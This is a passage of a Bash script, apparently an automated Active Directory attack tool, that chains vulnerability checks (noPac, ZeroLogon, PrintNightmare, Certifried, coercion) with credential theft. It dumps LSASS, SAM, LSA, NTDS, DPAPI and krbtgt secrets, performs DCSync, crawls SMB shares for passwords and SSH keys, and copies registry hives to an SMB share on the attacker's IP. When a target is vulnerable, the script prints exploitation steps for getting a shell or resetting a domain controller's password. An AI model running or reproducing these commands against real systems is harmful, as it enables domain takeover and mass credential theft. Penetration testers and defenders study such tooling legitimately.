        run_command "${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -f passw user admin account network login key logon cred -l ${output_dir}/Shares/manspiderDump" 2>&1 | tee -a ${output_dir}/Shares/manspider_output_${dc_domain}.txt
        echo -e "${CYAN}[*] Searching for SSH keys${NC}"
        run_command "${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -e ppk rsa pem ssh rsa -o -f id_rsa id_dsa id_ed25519 -l ${output_dir}/Shares/manspiderDump" 2>&1 | tee -a ${output_dir}/Shares/manspider_output_${dc_domain}.txt
        echo -e "${CYAN}[*] Searching for files with interesting extensions${NC}"
        run_command "${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg txt cfg conf config xml cspkg publishsettings json cnf sql cmd -l ${output_dir}/Shares/manspiderDump" 2>&1 | tee -a ${output_dir}/Shares/manspider_output_${dc_domain}.txt
        echo -e "${CYAN}[*] Searching for Password manager files${NC}"
        run_command "${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -e kdbx kdb 1pif agilekeychain opvault lpd dashlane psafe3 enpass bwdb msecure stickypass pwm rdb safe zps pmvault mywallet jpass pwmdb -l ${output_dir}/Shares/manspiderDump" 2>&1 | tee -a ${output_dir}/Shares/manspider_output_${dc_domain}.txt
        echo -e "${CYAN}[*] Searching for word passw in documents${NC}"
        run_command "${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -c passw login -e docx xlsx xls pdf pptx csv -l ${output_dir}/Shares/manspiderDump" 2>&1 | tee -a ${output_dir}/Shares/manspider_output_${dc_domain}.txt
        echo -e "${CYAN}[*] Searching for words in downloaded files${NC}"
        run_command "${manspider} ${output_dir}/Shares/manspiderDump -q -t 100 -c passw key login -l ${output_dir}/Shares/manspiderDump" 2>&1 | tee -a ${output_dir}/Shares/manspider_output_${dc_domain}.txt
        echo -e ""
    fi
}

###### Vulnerability checks
nopac_check () {
    echo -e "${BLUE}[*] NoPac check ${NC}"
    if [ "${kerb_bool}" == true ] ; then
        echo -e "${PURPLE}[-] netexec's nopac does not support kerberos authentication${NC}"
    else
        for i in $(/bin/cat ${target_dc}); do
            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M nopac --log ${output_dir}/Vulnerabilities/ne_nopac_output_${dc_domain}.txt" 2>&1
            if grep -q "VULNERABLE" ${output_dir}/Vulnerabilities/ne_nopac_output_${dc_domain}.txt 2>/dev/null; then
                echo -e "${GREEN}[+] Domain controller vulnerable to noPac found! Follow steps below for exploitation:${NC}"
                echo -e "${CYAN}# Get shell:${NC}"
                echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip ${argument_ThePorgs} --impersonate Administrator -shell [-use-ldap]"
                echo -e "${CYAN}# Dump hashes:${NC}"
                echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip ${argument_ThePorgs} --impersonate Administrator -dump [-use-ldap]"
            fi
        done
    fi
    echo -e ""
}

petitpotam_check () {
    echo -e "${BLUE}[*] PetitPotam check ${NC}"
    for i in $(/bin/cat ${target_dc}); do
        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M petitpotam --log ${output_dir}/Vulnerabilities/ne_petitpotam_output_${dc_domain}.txt" 2>&1
    done
    echo -e ""
}

dfscoerce_check () {
    echo -e "${BLUE}[*] dfscoerce check ${NC}"
    for i in $(/bin/cat ${target_dc}); do
        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M dfscoerce --log ${output_dir}/Vulnerabilities/ne_dfscoerce_output_${dc_domain}.txt" 2>&1
    done
    echo -e ""
}

zerologon_check () {
    echo -e "${BLUE}[*] zerologon check. This may take a while... ${NC}"
    for i in $(/bin/cat ${target_dc}); do
        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M zerologon --log ${output_dir}/Vulnerabilities/ne_zerologon_output_${dc_domain}.txt" 2>&1
    done
    if grep -q "VULNERABLE" ${output_dir}/Vulnerabilities/ne_zerologon_output_${dc_domain}.txt 2>/dev/null; then
        echo -e "${GREEN}[+] Domain controller vulnerable to ZeroLogon found! Follow steps below for exploitation:${NC}"
        echo -e "${CYAN}1. Exploit the vulnerability, set the NT hash to \\x00*8:${NC}"
        echo -e "cve-2020-1472-exploit.py $dc_NETBIOS $dc_ip"
        echo -e "${CYAN}2. Obtain the Domain Admin's NT hash:${NC}"
        echo -e "secretsdump.py $dc_domain/$dc_NETBIOS\$@$dc_ip -no-pass -just-dc-user Administrator"
        echo -e "${CYAN}3. Obtain the machine account hex encoded password:${NC}"
        echo -e "secretsdump.py -hashes :<NTLMhash_Administrator> $dc_domain/Administrator@$dc_ip"
        echo -e "${CYAN}4. Restore the machine account password:${NC}"
        echo -e "restorepassword.py -target-ip $dc_ip $dc_domain/$dc_NETBIOS@$dc_NETBIOS -hexpass <HexPass_$dc_NETBIOS>"
    fi
    echo -e ""
}

ms14-068_check () {
    echo -e "${BLUE}[*] MS14-068 check ${NC}"
    if [ ! -f "${impacket_goldenPac}" ]; then
        echo -e "${RED}[-] goldenPac.py not found! Please verify the installation of impacket${NC}"
    else
        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] MS14-068 requires credentials and does not support kerberos authentication${NC}"
        else
            run_command "${impacket_goldenPac} ${argument_imp_gp}@${dc_FQDN} None -target-ip ${dc_ip}" 2>&1 | tee ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt
            if grep -q "found vulnerable" ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt; then
                echo -e "${GREEN}[+] Domain controller vulnerable to MS14-068 found (False positives possible on newer versions of Windows)!${NC}"
                echo -e "${CYAN}# Execute command below to get shell:${NC}"
                echo -e "${impacket_goldenPac} ${argument_imp}@${dc_FQDN} -target-ip ${dc_ip}"
            fi
        fi
    fi
    echo -e ""
}

ms17-010_check () {
    echo -e "${BLUE}[*] MS17-010 check ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M ms17-010 --log ${output_dir}/Vulnerabilities/ne_ms17-010_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

spooler_check () {
    echo -e "${BLUE}[*] Print Spooler check ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M spooler --log ${output_dir}/Vulnerabilities/ne_spooler_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

printnightmare_check () {
    echo -e "${BLUE}[*] Print Nightmare check ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M printnightmare --log ${output_dir}/Vulnerabilities/ne_printnightmare_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

webdav_check () {
    echo -e "${BLUE}[*] WebDAV check ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M webdav --log ${output_dir}/Vulnerabilities/ne_webdav_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

shadowcoerce_check () {
    echo -e "${BLUE}[*] shadowcoerce check ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M shadowcoerce --log ${output_dir}/Vulnerabilities/ne_shadowcoerce_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

smbsigning_check () {
    echo -e "${BLUE}[*] Listing servers with SMB signing disabled or not required ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} --gen-relay-list ${output_dir}/Vulnerabilities/ne_smbsigning_output_${dc_domain}.txt" 2>&1
    if [ ! -s ${output_dir}/Vulnerabilities/ne_smbsigning_output_${dc_domain}.txt ]; then
        echo -e "${PURPLE}[-] No servers with SMB signing disabled found ${NC}"
    fi
    echo -e ""
}

ntlmv1_check () {
    echo -e "${BLUE}[*] ntlmv1 check ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M ntlmv1 --log ${output_dir}/Vulnerabilities/ne_ntlmv1_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

runasppl_check () {
    echo -e "${BLUE}[*] runasppl check ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M runasppl --log ${output_dir}/Vulnerabilities/ne_runasppl_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

rpcdump_check () {
    if [ ! -f "${impacket_rpcdump}" ] ; then
        echo -e "${RED}[-] rpcdump.py not found! Please verify the installation of impacket${NC}"
    elif [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
        echo -e "${PURPLE}[-] rpcdump does not support kerberos authentication${NC}"
    else
        echo -e "${BLUE}[*] Impacket rpcdump${NC}"
        smb_scan
        for i in $(/bin/cat ${servers_smb_list}); do
            echo -e "${CYAN}[*] RPC Dump of ${i} ${NC}"
            run_command "${impacket_rpcdump} ${argument_imp}@$i" 2>&1 > ${output_dir}/Vulnerabilities/RPCDump/impacket_rpcdump_output_${i}.txt
            inte_prot="MS-RPRN MS-PAR MS-EFSR MS-FSRVP MS-DFSNM MS-EVEN"
            for prot in $inte_prot; do
                prot_grep=$(cat ${output_dir}/Vulnerabilities/RPCDump/impacket_rpcdump_output_${i}.txt | grep -a "$prot")
                if [ ! "${prot_grep}" == "" ]; then
                    echo -e "${GREEN}[+] $prot_grep found at ${i}${NC}"
                fi
            done
        done
        echo -e ""
    fi
    echo -e ""
}

coercer_check () {
    if [ ! -f "${coercer}" ] ; then
        echo -e "${RED}[-] coercer not found! Please verify the installation of impacket${NC}"
    elif [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
        echo -e "${PURPLE}[-] coercer does not support kerberos authentication${NC}"
    else
        echo -e "${BLUE}[*] Running scan using coercer ${NC}"
        smb_scan
        for i in $(/bin/cat ${servers_smb_list}); do
            run_command "${coercer} scan ${argument_coercer} -t ${i} --dc-ip $dc_ip --export-xlsx ${output_dir}/Vulnerabilities/Coercer/coercer_output_${i}.xlsx" 2>&1 | tee ${output_dir}/Vulnerabilities/Coercer/coercer_output_${i}.txt
        done
        if grep -q -r "SMB  Auth" ${output_dir}/Vulnerabilities/Coercer/ 2>/dev/null; then
            echo -e "${GREEN}[+] Servers vulnerable to Coerce attacks found! Follow steps below for exploitation:${NC}"
            echo -e "${CYAN}1. Run responder on second terminal to capture hashes:${NC}"
            echo -e "sudo responder -I $attacker_interface"
            echo -e "${CYAN}2. Coerce target server:${NC}"
            echo -e  "${coercer} coerce ${argument_coercer} -t ${i} -l $attacker_IP --dc-ip $dc_ip"
        fi
        echo -e ""
    fi
    echo -e ""
}

certifried_check () {
    if [[ ! -f "${certipy}" ]] ; then
        echo -e "${RED}[-] Please verify the installation of certipy${NC}"
    else
        echo -e "${BLUE}[*] Certifried Vulnerability Check${NC}"
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] certipy requires credentials${NC}"
        else
            ne_adcs_enum
            current_dir=$(pwd)
            cd ${output_dir}/Credentials
            i=0
            for pki_server in $pki_servers; do
                i=$((i + 1))
                pki_ca=$(echo -e $pki_cas | sed -n ${i}p)
                run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -target ${pki_server} -ca ${pki_ca} -template User" 2>&1 | tee ${output_dir}/Vulnerabilities/certifried_check_${pki_server}_${dc_domain}.txt
                if ! grep -q "Certificate object SID is" ${output_dir}/Vulnerabilities/certifried_check_${pki_server}_${dc_domain}.txt 2>/dev/null; then
                    echo -e "${GREEN}[+] ${pki_server} potentially vulnerable to Certifried! Follow steps below for exploitation:${NC}"
                    echo -e "${CYAN}1. Create a new computer account with a dNSHostName property of a Domain Controller:${NC}"
                    echo -e "${certipy} account create ${argument_certipy} -user NEW_COMPUTER_NAME -pass NEW_COMPUTER_PASS -dc-ip $dc_ip -dns $dc_NETBIOS.$dc_domain"
                    echo -e "${CYAN}2. Obtain a certificate for the new computer:${NC}"
                    echo -e "${certipy} req -u NEW_COMPUTER_NAME\$@${dc_domain} -p NEW_COMPUTER_PASS -dc-ip $dc_ip -target $pki_server -ca ${pki_ca} -template Machine"
                    echo -e "${CYAN}3. Authenticate using pfx:${NC}"
                    echo -e "${certipy} auth -pfx ${dc_NETBIOS}.pfx -username ${dc_NETBIOS}\$ -dc-ip ${dc_ip}"
                    echo -e "${CYAN}4. Delete the created computer:${NC}"
                    echo -e "${certipy} account delete ${argument_certipy} -dc-ip ${dc_ip} -user NEW_COMPUTER_NAME "                 
                fi
            done
            cd ${current_dir}
        fi
    fi
    echo -e ""
}

#MSSQL scan
mssql_enum () {
    if [ ! -f "${windapsearch}" ] || [ ! -f "${impacket_GetUserSPNs}" ]; then
        echo -e "${RED}[-] Please verify the location of windapsearch and GetUserSPNs.py${NC}"
    else
        echo -e "${BLUE}[*] MSSQL Enumeration${NC}"
        /bin/cat ${output_dir}/DomainRecon/Servers/sql_list_*_${dc_domain}.txt 2>/dev/null | sed -e 's/ //' -e 's/\$//' -e 's/.*/\U&/' | sort -uf > ${sql_hostname_list} 2>&1
        for i in $(/bin/cat ${sql_hostname_list} 2>/dev/null ); do
            grep -i $(echo $i | cut -d "." -f 1) ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 | sort -u > ${sql_ip_list}
        done
        if [ -f "${target_sql}" ] ; then
            run_command "${netexec} ${ne_verbose} mssql ${target_sql} ${argument_ne} -M mssql_priv --log ${output_dir}/DomainRecon/ne_mssql_priv_output_${dc_domain}.txt" 2>&1
        else
            echo -e "${PURPLE}[-] No SQL servers found! Please re-run SQL enumeration and try again..${NC}"
        fi
    fi
    echo -e ""
}

###### Password Dump
juicycreds_dump () {
    echo -e "${BLUE}[*] Search for juicy credentials: Firefox, KeePass, Rdcman, Teams, WiFi, WinScp${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    for i in $(/bin/cat ${servers_smb_list}); do
        echo -e "${CYAN}[*] Searching in ${i} ${NC}"
        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M firefox --log ${output_dir}/Credentials/firefox_${dc_domain}_${i}.txt" 2>&1
        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M keepass_discover --log ${output_dir}/Credentials/keepass_discover_${dc_domain}_${i}.txt" 2>&1
        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M rdcman --log ${output_dir}/Credentials/rdcman_${dc_domain}_${i}.txt" 2>&1
        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M teams_localdb --log ${output_dir}/Credentials/teams_localdb_${dc_domain}_${i}.txt" 2>&1
        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M wifi --log ${output_dir}/Credentials/wifi_${dc_domain}_${i}.txt" 2>&1
        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M winscp --log ${output_dir}/Credentials/winscp_${dc_domain}_${i}.txt" 2>&1
    done
    echo -e ""
}

msol_dump () {
    echo -e "${BLUE}[*] MSOL password dump${NC}"
    target_msol=""
    read -p ">> " target_msol </dev/tty
    while [ ! -s "${target_msol}" ] ; do
        echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
        read -p ">> " target_msol </dev/tty
    done
    run_command "${netexec} ${ne_verbose} smb ${target_msol} ${argument_ne} -M msol --log ${output_dir}/Credentials/msol_${dc_domain}_${i}.txt" 2>&1
    echo -e ""
}

veeam_dump () {
    echo -e "${BLUE}[*] Veeam credentials Dump${NC}"
    target_veeam=""
    read -p ">> " target_veeam </dev/tty
    while [ ! -s "${target_veeam}" ] ; do
        echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
        read -p ">> " target_veeam </dev/tty
    done
    run_command "${netexec} ${ne_verbose} smb ${target_veeam} ${argument_ne} -M veeam --log ${output_dir}/Credentials/veeam_${dc_domain}_${i}.txt" 2>&1
    echo -e ""
}

laps_dump () {
    echo -e "${BLUE}[*] LAPS Dump${NC}"
    run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} -M laps --kdcHost ${dc_FQDN} --log ${output_dir}/Credentials/laps_dump_${dc_domain}.txt" 2>&1
    echo -e ""
}

gmsa_dump () {
    echo -e "${BLUE}[*] gMSA Dump${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] gMSA Dump requires credentials${NC}"
    else
        run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} --gmsa --log ${output_dir}/Credentials/gMSA_dump_${dc_domain}.txt" 2>&1
    fi
    echo -e ""
}

secrets_dump_dcsync () {
    if [ ! -f "${impacket_secretsdump}" ] ; then
        echo -e "${RED}[-] secretsdump.py not found! Please verify the installation of impacket${NC}"
    else
        echo -e "${BLUE}[*] Performing DCSync using secretsdump${NC}"
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] DCSync requires credentials${NC}"
        else
            run_command "${impacket_secretsdump} ${argument_imp}@${target} -just-dc" | tee ${output_dir}/Credentials/dcsync_${dc_domain}.txt
        fi
    fi
    echo -e ""
}

secrets_dump () {
    if [ ! -f "${impacket_secretsdump}" ] ; then
        echo -e "${RED}[-] secretsdump.py not found! Please verify the installation of impacket${NC}"
    else
        echo -e "${BLUE}[*] Dumping credentials using secretsdump${NC}"
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] secretsdump requires credentials${NC}"
        else
            smb_scan
            for i in $(/bin/cat ${servers_smb_list}); do
                echo -e "${CYAN}[*] secretsdump of ${i} ${NC}"
                run_command "${impacket_secretsdump} ${argument_imp}@${i} -dc-ip ${dc_ip}" | tee ${output_dir}/Credentials/secretsdump_${dc_domain}_${i}.txt
            done
        fi
    fi
    echo -e ""
}

samsystem_dump () {
    if [ ! -f "${impacket_reg}" ] ; then
        echo -e "${RED}[-] reg.py not found! Please verify the installation of impacket${NC}"
    else
        echo -e "${BLUE}[*] Extraction SAM SYSTEM and SECURITY using reg${NC}"
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] reg requires credentials${NC}"
        else
            smb_scan
            echo -e "${YELLOW}[*] Run an SMB server using the following command and then press ENTER to continue....${NC}"
            echo -e "${impacket_smbserver} -ip $attacker_IP -smb2support "lwpshare" "${output_dir}/Credentials/""
            read -p "" </dev/tty
            for i in $(/bin/cat ${servers_smb_list}); do
                echo -e "${CYAN}[*] reg save of ${i} ${NC}"
                mkdir -p ${output_dir}/Credentials/SAMDump/${i}
                run_command "${impacket_reg} ${argument_imp}@${i} -dc-ip ${dc_ip} backup -o \\\\$attacker_IP\\lwpshare\\SAMDump\\$i" | tee ${output_dir}/Credentials/SAMDump/regsave_${dc_domain}_${i}.txt
            done
        fi
    fi
    echo -e ""
}

ntds_dump () {
    echo -e "${BLUE}[*] Dumping NTDS using netexec${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] NTDS dump requires credentials${NC}"
    else
        run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --ntds --log ${output_dir}/Credentials/ntds_dump_${dc_domain}.txt" 2>&1
        #${netexec} ${ne_verbose} smb ${target} "${argument_ne}" -M ntdsutil --log ${output_dir}/Credentials/ntds_dump_${dc_domain}.txt
    fi
    echo -e ""
}

sam_dump () {
    echo -e "${BLUE}[*] Dumping SAM credentials${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] SAM dump requires credentials${NC}"
    else
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
            curr_targets="Domain Controllers"
        fi
        smb_scan
        for i in $(/bin/cat ${servers_smb_list}); do
            echo -e "${CYAN}[*] SAM dump of ${i} ${NC}"
            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --sam --log ${output_dir}/Credentials/sam_dump_${dc_domain}_${i}.txt" 2>&1
        done
    fi
    echo -e ""
}

lsa_dump () {
    echo -e "${BLUE}[*] Dumping LSA credentials${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] LSA dump requires credentials${NC}"
    else
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
            curr_targets="Domain Controllers"
        fi
        smb_scan
        for i in $(/bin/cat ${servers_smb_list}); do
            echo -e "${CYAN}[*] LSA dump of ${i} ${NC}"
            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --lsa --log ${output_dir}/Credentials/lsa_dump_${dc_domain}_${i}.txt" 2>&1
        done
    fi
    echo -e ""
}

lsassy_dump () {
    echo -e "${BLUE}[*] Dumping LSASS using lsassy${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
    else
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
            curr_targets="Domain Controllers"
        fi
        smb_scan
        for i in $(/bin/cat ${servers_smb_list}); do
            echo -e "${CYAN}[*] LSASS dump of ${i} using lsassy${NC}"
            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M lsassy --log ${output_dir}/Credentials/lsass_dump_lsassy_${dc_domain}_${i}.txt" 2>&1
        done
    fi
    echo -e ""
}

handlekatz_dump () {
    echo -e "${BLUE}[*] Dumping LSASS using handlekatz${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
    else
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
            curr_targets="Domain Controllers"
        fi
        smb_scan
        for i in $(/bin/cat ${servers_smb_list}); do
            echo -e "${CYAN}[*] LSASS dump of ${i} using handlekatz${NC}"
            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M handlekatz --log ${output_dir}/Credentials/lsass_dump_handlekatz_${dc_domain}_${i}.txt" 2>&1
        done
    fi
    echo -e ""
}

procdump_dump () {
    echo -e "${BLUE}[*] Dumping LSASS using procdump${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
    else
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
            curr_targets="Domain Controllers"
        fi
        smb_scan
        for i in $(/bin/cat ${servers_smb_list}); do
            echo -e "${CYAN}[*] LSASS dump of ${i} using procdump ${NC}"
            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M procdump --log ${output_dir}/Credentials/lsass_dump_procdump_${dc_domain}_${i}.txt" 2>&1
        done
    fi
    echo -e ""
}

nanodump_dump () {
    echo -e "${BLUE}[*] Dumping LSASS using nanodump${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
    else
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
            curr_targets="Domain Controllers"
        fi
        smb_scan
        for i in $(/bin/cat ${servers_smb_list}); do
            echo -e "${CYAN}[*] LSASS dump of ${i} using nanodump ${NC}"
            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M nanodump --log ${output_dir}/Credentials/lsass_dump_nanodump_${dc_domain}_${i}.txt" 2>&1
        done
    fi
    echo -e ""
}

dpapi_dump () {
    echo -e "${BLUE}[*] Dumping DPAPI secrets using netexec${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] DPAPI dump requires credentials${NC}"
    else
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
            curr_targets="Domain Controllers"
        fi
        smb_scan
        for i in $(/bin/cat ${servers_smb_list}); do
            echo -e "${CYAN}[*] DPAPI dump of ${i} using netexec ${NC}"
            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --dpapi cookies --log ${output_dir}/Credentials/dpapi_dump_${dc_domain}_${i}.txt" 2>&1
            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --dpapi nosystem --log ${output_dir}/Credentials/dpapi_dump_${dc_domain}_${i}.txt" 2>&1
        done
    fi
    echo -e ""
}

donpapi_dump () {
    if [ ! -f "${donpapi}" ] ; then
        echo -e "${RED}[-] DonPAPI.py not found! Please verify the installation of DonPAPI${NC}"
    else
        echo -e "${BLUE}[*] Dumping secrets using DonPAPI${NC}"
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] DonPAPI requires credentials${NC}"
        else
            smb_scan
            current_dir=$(pwd)
            cd ${output_dir}/Credentials
            for i in $(/bin/cat ${servers_smb_list}); do
                echo -e "${CYAN}[*] DonPAPI dump of ${i} ${NC}"
                run_command "${donpapi} ${argument_donpapi}@${i} -dc-ip ${dc_ip}" | tee ${output_dir}/Credentials/DonPAPI_${dc_domain}_${i}.txt   
            done
            cd ${current_dir}
        fi
    fi
    echo -e ""
}

hekatomb_dump () {
    if [ ! -f "${hekatomb}" ] ; then
        echo -e "${RED}[-] hekatomb.py not found! Please verify the installation of HEKATOMB${NC}"
    else
        echo -e "${BLUE}[*] Dumping secrets using hekatomb${NC}"
        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
            echo -e "${PURPLE}[-] hekatomb requires credentials and does not support kerberos authenticaiton${NC}"
        else
            current_dir=$(pwd)
            cd ${output_dir}/Credentials
            run_command "${hekatomb} ${argument_hekatomb}@${dc_ip} -dns ${dc_ip} -smb2 -csv" | tee ${output_dir}/Credentials/hekatomb_${dc_domain}.txt
            cd ${current_dir} 
        fi
    fi
    echo -e ""
}

masky_dump () {
    echo -e "${BLUE}[*] Dumping LSASS using masky (ADCS required)${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
    else
        ne_adcs_enum
        if [ ! "${pki_servers}" == "" ] && [ ! "${pki_cas}" == "" ]; then
            if [ "${kerb_bool}" == true ]; then
                echo -e "${PURPLE}[-] Targeting DCs only${NC}"
                curr_targets="Domain Controllers"
            fi
            smb_scan
            i=0
            for pki_server in $pki_servers; do
                i=$((i + 1))
                pki_ca=$(echo -e $pki_cas | sed -n ${i}p)
                for i in $(/bin/cat ${servers_smb_list}); do
                    echo -e "${CYAN}[*] LSASS dump of ${i} using masky (PKINIT)${NC}"
                    run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M masky -o CA=${pki_server}\\${pki_ca} --log ${output_dir}/Credentials/lsass_dump_masky_${dc_domain}_${i}.txt" 2>&1
                done
            done
        else
            echo -e "${PURPLE}[-] No ADCS servers found! Please re-run ADCS enumeration and try again..${NC}"
        fi
    fi
    echo -e ""
}

certsync_ntds_dump () {
    if [ ! -f "${certsync}" ] ; then
        echo -e "${RED}[-] Please verify the installation of certsync${NC}"
    else
        echo -e "${BLUE}[*] Dumping NTDS using certsync${NC}"
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] certsync requires credentials${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
            run_command "${certsync} ${argument_certsync} -dc-ip ${dc_ip} -dns-tcp -ns ${dc_ip} ${ldaps_param} -kdcHost ${dc_FQDN} -outputfile ${output_dir}/Credentials/certsync_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

get_hash_krbtgt (){
    if [ ! -f "${impacket_secretsdump}" ] ; then
        echo -e "${RED}[-] secretsdump.py not found! Please verify the installation of impacket${NC}"
    else
        if [ ! -f "${output_dir}/Credentials/hash_krbtgt_${dc_domain}.txt" ]; then
            echo -e "${BLUE}[*] Extracting NTLM hash and AES keys of krbtgt${NC}"
            if [ "${nullsess_bool}" == true ] ; then
                echo -e "${PURPLE}[-] DCSync requires credentials${NC}"
            else
                run_command "${impacket_secretsdump} ${argument_imp}@${target} -just-dc-user $(echo ${domain} | cut -d "." -f 1)/krbtgt" | tee ${output_dir}/Credentials/hash_krbtgt_${dc_domain}.txt
            fi
        fi
        krbtgt_nt=$(/bin/cat "${output_dir}/Credentials/hash_krbtgt_${dc_domain}.txt" | grep krbtgt |grep -v "aes\|des" | cut -d ":" -f 4)
